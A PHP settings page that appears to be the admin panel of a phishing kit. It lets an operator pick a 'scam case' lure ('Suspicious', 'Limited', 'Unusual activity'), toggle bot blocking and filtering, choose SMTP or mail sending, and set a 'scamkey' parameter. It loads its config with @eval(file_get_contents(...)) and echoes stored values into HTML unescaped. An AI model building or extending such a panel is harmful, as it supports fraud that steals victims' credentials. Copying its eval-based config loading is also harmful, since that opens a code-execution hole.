<?php
require_once __DIR__ . '/../function.php';

$xconfig = false;
$actual_page = 'general';

if(isset($_POST['save'])) {
	$a = $_POST['apikey'];
	$b = $_POST['model'];
  $c = $_POST['scamcase'];
	$d = $_POST['filter'];
	$e = $_POST['blocker'];
  $f = $_POST['sending'];
  $g = $_POST['translate'];
  $h = $_POST['scamkey'];
	$api->setGeneral(array($a, $b, $c, $d, $e, $f, $g, $h));
  $msg = '<div class="success">Changes have been saved!</div>';
}

if (file_exists($api->dir_config.'/'.$api->general_config)) {
  $xconfig = true;
  @eval(file_get_contents($api->dir_config.'/'.$api->general_config));
}
?>
<?php require 'page/header.php'; ?>

	<div id="main">

		<?php require 'page/sidebar.php'; ?>

		<div class="content">
			<div class="top-subhead">
				<h2>General Settings</h2>
				<div class="clear"></div>
			</div>
			<div class="full-container no-border">
				<?php
					if (isset($_POST['save'])) {
						echo $msg;
					}
				?>
					<form method="post" action="" autocomplete="off">
						<ul id="settings">
							<li>
								<div class="left">Apikey</div>
								<div class="right">
									<input type="password" name="apikey" <?php if($xconfig == true){ echo "value=\"$config_apikey\""; } ?> required>
								</div>
							</li>
              <li>
								<div class="left">Model</div>
								<div class="right">
									<select name="model">
										<?php if($xconfig == true && $config_model == "old"){
											echo '<option value="old" selected>Old</option>
                      <option value="new">New</option>';
										} else {
											echo '<option value="old">Old</option>
                      <option value="new" selected>New</option>';
										}
                    ?>
									</select>
								</div>
							</li>
              <li>
                <div class="left">Case</div>
                <div class="right">
                  <select name="scamcase">
                    <?php if($xconfig == true && $config_scamcase == "suspicious"){
                      echo '<option value="suspicious" selected>Suspicious</option>
                      <option value="limited">Limited</option>
											<option value="unusual">Unusual activity</option>';
										} else if($xconfig == true && $config_scamcase == "unusual"){
											echo '<option value="suspicious">Suspicious</option>
											<option value="limited">Limited</option>
											<option value="unusual" selected>Unusual activity</option>';
                    } else {
                      echo '<option value="suspicious">Suspicious</option>
                      <option value="limited" selected>Limited</option>
											<option value="unusual">Unusual activity</option>';
                    }?>
                  </select>
                </div>
              </li>
							<li>
								<div class="left">Filter</div>
								<div class="right">
									<select name="filter">
										<?php if($xconfig == true && $config_filter == "enable"){
											echo '<option value="enable" selected>Enable</option>
                      <option value="disable">Disable</option>';
										} else {
											echo '<option value="enable">Enable</option>
                      <option value="disable" selected>Disable</option>';
										}
                    ?>
									</select>
								</div>
							</li>
							<li>
								<div class="left">Translate</div>
								<div class="right">
									<select name="translate">
										<?php if($xconfig == true && $config_translate == "enable"){
											echo '<option value="enable" selected>Enable</option>
											<option value="disable">Disable</option>';
										} else {
											echo '<option value="enable">Enable</option>
											<option value="disable" selected>Disable</option>';
										}
										?>
									</select>
								</div>
							</li>
							<li>
								<div class="left">Blocker</div>
								<div class="right">
									<select name="blocker">
										<?php if($xconfig == true && $config_blocker == "enable"){
											echo '<option value="enable" selected>Enable</option>
                      <option value="disable">Disable</option>';
										} else {
											echo '<option value="enable">Enable</option>
                      <option value="disable" selected>Disable</option>';
										}
                    ?>
									</select>
								</div>
							</li>
              <li>
								<div class="left">Sending</div>
								<div class="right">
									<select name="sending">
										<?php if($xconfig == true && $config_smtp == "enable"){
											echo '<option value="enable" selected>smtp</option>
                      <option value="disable">mail</option>';
										} else {
											echo '<option value="enable">smtp</option>
                      <option value="disable" selected>mail</option>';
										}
                    ?>
									</select>
								</div>
							</li>
              <li>
                <div class="left">Parameter</div>
                <div class="right">
                  <input type="text" <?php if($xconfig == true){ echo "value=\"$config_scamkey\""; } ?> name="scamkey">
                </div>
              </li>
						</ul>
						<br>
						<input type="submit" name="save" value="Save changes">
					</form>
			</div>
		</div>
		<div class="clear"></div>
	</div>
</body>

</html>
